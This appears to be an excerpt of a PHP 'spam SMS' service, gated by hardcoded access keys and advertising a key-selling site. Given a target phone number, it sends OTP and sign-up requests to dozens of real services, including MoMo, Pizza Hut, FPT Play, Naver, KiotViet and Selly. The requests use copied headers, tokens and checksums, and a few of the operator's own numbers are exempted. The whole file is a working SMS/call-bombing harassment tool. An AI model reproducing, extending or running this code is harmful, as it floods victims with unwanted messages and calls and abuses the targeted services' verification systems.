...
if(isset($_GET["key"])){
	...
	if($key == "ducknha@123*" or $check["status"] == "success"){/*
	}if($key == "phanvankha@123" or $check["status"] == "success"){*/
		if(isset($_GET["phone"])){
			$sdt = $_GET["phone"];
		...
		echo ECHOJSON(array("status" => "error", "msg" => "key sai web bán key spam sms api.phanvankha.site")); exit;
	}
} else {
...
if(strlen($sdt) < 10){
	...
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if($sdt == "0915657049" or $sdt =="0389156784" or $sdt == "0833823392"){
	echo ECHOJSON(array("msg" => "Spam Com Kẹt")); exit;
}
$MONEYVEO = MONEYVEO($sdt);/// otp callllll
if($MONEYVEO["MONEYVEO"] == "Thành Công"){$dem ++;} else {$error ++;}
$VAYVND = VAYVND($sdt);///send otp/////////
if($VAYVND["VAYVND"] == "Thành Công"){$dem ++;} else {$error ++;}
$ROBOCASH = ROBOCASH($sdt);/// otp callllll//
if($ROBOCASH["ROBOCASH"] == "Thành Công"){$dem ++;} else {$error ++;}
...
if($VTPAY["VTPAY"] == "Thành Công"){$dem ++;} else {$error ++;}
$MOMO = MOMO($sdt);//otp call
if($MOMO["MOMO"] == "Thành Công"){$dem ++;} else {$error ++;}
...
$KIOTVIET = KIOTVIET($sdt);
if($KIOTVIET["KIOTVIET"] == "Thành Công"){$dem ++;} else {$error ++;} 
$BATDONGSAN = BATDONGSAN($sdt);
if($BATDONGSAN["BATDONGSAN"] == "Thành Công"){$dem ++;} else {$error ++;} 
$THITRUONGSI = THITRUONGSI($sdt);
if($THITRUONGSI["THITRUONGSI"] == "Thành Công"){$dem ++;} else {$error ++;} 
$VOSO = VOSO($sdt);
if($VOSO["VOSO"] == "Thành Công"){$dem ++;} else {$error ++;} 
$RIVIU = RIVIU($sdt);
if($RIVIU["RIVIU"] == "Thành Công"){$dem ++;} else {$error ++;} 
$ICANKID = ICANKID($sdt);
if($ICANKID["ICANKID"] == "Thành Công"){$dem ++;} else {$error ++;} 
$KIDSPLAZA = KIDSPLAZA($sdt);
if($KIDSPLAZA["KIDSPLAZA"] == "Thành Công"){$dem ++;} else {$error ++;} 
$SELLY = SELLY($sdt);
if($SELLY["SELLY"] == "Thành Công"){$dem ++;} else {$error ++;} 
$PIZZAHUT = PIZZAHUT($sdt);
if($PIZZAHUT["PIZZAHUT"] == "Thành Công"){$dem ++;} else {$error ++;} 
$ALFRESCOS = ALFRESCOS($sdt);
if($ALFRESCOS["ALFRESCOS"] == "Thành Công"){$dem ++;} else {$error ++;} 
$FPTPLAY = FPTPLAY($sdt);
if($FPTPLAY["FPTPLAY"] == "Thành Công"){$dem ++;} else {$error ++;} 
$NAVER = NAVER($sdt);
if($NAVER["NAVER"] == "Thành Công"){$dem ++;} else {$error ++;} 
$array = array(
	"1" => $MOMO["MOMO"],
	"2" => $META["META"],
	"3" => $FPTSHOP["FPTSHOP"],
  ...
  "43" => $BIBABO["BIBABO"],
  "44" => $KIOTVIET["KIOTVIET"],
  "45" => $BATDONGSAN["BATDONGSAN"], 
  "46" => $THITRUONGSI["THITRUONGSI"], 
  "47" => $VOSO["VOSO"],  
  "48" => $RIVIU["RIVIU"], 
  "49" => $ICANKID["ICANKID"],  
  "50" => $KIDSPLAZA["KIDSPLAZA"],
  "51" => $SELLY["SELLY"], 
  "52" => $PIZZAHUT["PIZZAHUT"], 
  "53" => $ALFRESCOS["ALFRESCOS"], 
  "54" => $FPTPLAY["FPTPLAY"],  
  "55" => $NAVER["NAVER"], 
);
$data = array(
...
function NAVER($sdt) {
  ...
  $payload = array(
    ...
    "m" => "0",
    "ssc" => "nid.join",
    "p" => "48eac3047f9caca509c86d5804cd170f",
    "lcsurl" => "https%3A%2F%2Fnid.naver.com%2Fuser2%2FV2Join%3Ftoken_sjoin%3D9iZQbueGWrcvcNf2%26langSelect%3Den_US%26chk_all%3Don%26termsService%3Don%26termsPrivacy%3Don%26termsLocation%3DY%26termsEmail%3DY",
    "px" => "286",
    "py" => "952",
    "sx" => "286",
    "sy" => "478",
    ...
    "ua_brand_0" => "Chromium",
    "ua_version_0" => "112",
    "ua_brand_1" => "Google%20Chrome",
    "ua_version_1" => "112",
    "ua_brand_2" => "Not%3AA-Brand",
    "ua_version_2" => "99",
    "ua_model" => "RMX1919",
    "ua_platform" => "Android",
    "ua_platformVersion" => "10.0.0",
    "ua_uaFullVersion" => "112.0.5615.136",
    "ua_full_brand_0" => "Chromium",
    "ua_full_version_0" => "112.0.5615.136",
    "ua_full_brand_1" => "Google%20Chrome",
    "ua_full_version_1" => "112.0.5615.136",
    "ua_full_brand_2" => "Not%3AA-Brand",
    "ua_full_version_2" => "99.0.0.0",
    "u" => "https%3A%2F%2Fnid.naver.com%2Fuser2%2FV2Join%3Ftoken_sjoin%3D9iZQbueGWrcvcNf2%26langSelect%3Den_US%26chk_all%3Don%26termsService%3Don%26termsPrivacy%3Don%26termsLocation%3DY%26termsEmail%3DY%23"
  );
  $options = array(
    "http" => array(
      "method" => "POST",
  ...
  if ($result === false) {
     return array("NAVER" => "Thất Bại");
	 } else {
		  return array("NAVER" => "Thành Công");
   }
}


function FPTPLAY($sdt) {
    $headers = array(
    ...
    $ch = curl_init('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%3A112.0.0.0)&drm=1');
    ...
    if ($response === false) {
        return array("FPTPLAY" => "Thất Bại");
	 } else {
		  return array("FPTPLAY" => "Thành Công");
   }
}


function ALFRESCOS($sdt) {
    $data = array(
        "phoneNumber" => $sdt,
    ...
    $ch = curl_init('https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN');
    curl_setopt($ch, CURLOPT_POST, true);
    ...
    if ($response === false) {
         return array("ALFRESCOS" => "Thất Bại");
	 } else {
		  return array("ALFRESCOS" => "Thành Công");
   }
}


function PIZZAHUT($sdt) {
  $headers = array(
    "Host: pizzahut.vn",
    "Content-Length: 91",
    "Accept: application/json, text/plain, */*",
  ...
  $ch = curl_init("https://pizzahut.vn/callApiStorelet/user/registerRequest");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  ...
  // Check if the response contains "errorCode:0" to determine success or failure
  if ($response) {
    return array("PIZZAHUT" => "Thành Công");
	 } else {
		  return array("PIZZAHUT" => "Thất Bại");
   }
}
...
function SELLY($sdt) {
    ...
    $data = array(
        "phone" => "+84" . substr($sdt, 1, 10),
        "forceSendSms" => true,
        "checksum" => "2f40418a44ed4a1323ec6bfe920a7e579709f0e0"
    );
    $data_json = json_encode($data);
    $ch = curl_init("https://app-api.selly.vn/users/request-otp");
    ...
    curl_close($ch);
    if ($response) {
      return array("SELLY" => "Thành Công");
	 } else {
		  return array("SELLY" => "Thất Bại");
   }
}

function KIDSPLAZA($sdt) {
    $headers = array(
    ...
    $data_json = json_encode($data);
    $ch = curl_init("https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response) {
        return array("KIDSPLAZA" => "Thành Công");
	 } else {
		  return array("KIDSPLAZA" => "Thất Bại");
   }
}


function ICANKID($sdt) {
    $headers = array(
        "Host: id.icankid.vn",
        "Connection: keep-alive",
        "Content-Length: 134",
    ...
    $data_json = json_encode($data);
    $ch = curl_init("https://id.icankid.vn/api/otp/challenge/");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response) {
        return array("ICANKID" => "Thành Công");
	 } else {
		  return array("ICANKID" => "Thất Bại");
   }
}
...
function RIVIU($sdt) {
    ...
    $data = array(
        "country_prefix" => "+84",
        "phone" => substr($sdt, 1, 10),
        "action" => "register"
    );
    $data_string = json_encode($data);
    $ch = curl_init('https://production-account.riviu.co/v1.0/otp/generate');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    ...
    curl_close($ch);
    if ($response === false) {
        return array("RIVIU" => "Thành Công");
	 } else {
		  return array("RIVIU" => "Thất Bại");
   }
}
...
function VOSO($sdt) {
  ...
  $data = array(
    ...
    "_csrf" => "_BXHlLomLJsUPjoAGs61hC-B0xJrzBlzFXUvG_PwnC6vJo3lyB4d8URUbnQtvt7uXrflUAq-TjJNIlZxscT2Tw=="
  );
  $options = array(
    "http" => array(
      "method" => "POST",
      "header" => implode("\r\n", array_map(function($v, $k) { return sprintf("%s: %s", $k, $v); }, $headers, array_keys($headers))),
  ...
  if ($response) {
       return array("VOSO" => "Thành Công");
	 } else {
		  return array("VOSO" => "Thất Bại");
   }
}



function THITRUONGSI($sdt) {
  $headers = array(
  ...
  $response = file_get_contents($url, false, $context);
  if ($response) {
      return array("THITRUONGSI" => "Thành Công");
	 } else {
		  return array("THITRUONGSI" => "Thất Bại");
   }
}


function BATDONGSAN($sdt) {
  ...
  $response = file_get_contents($url, false, $context);
  if ($response) {
       return array("BATDONGSAN" => "Thành Công");
	 } else {
		  return array("BATDONGSAN" => "Thất Bại");
   }
}


function KIOTVIET($sdt){
  $rds = substr(str_shuffle("0123456789abcdef"), 0, 7);
  $headers = array(
  ...
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_POST, true);
  ...
  if ($httpcode == 200 && strpos($response, "success") !== false) {
     return array("KIOTVIET" => "Thành Công");
	 } else {
		  return array("KIOTVIET" => "Thất Bại");
   }
}
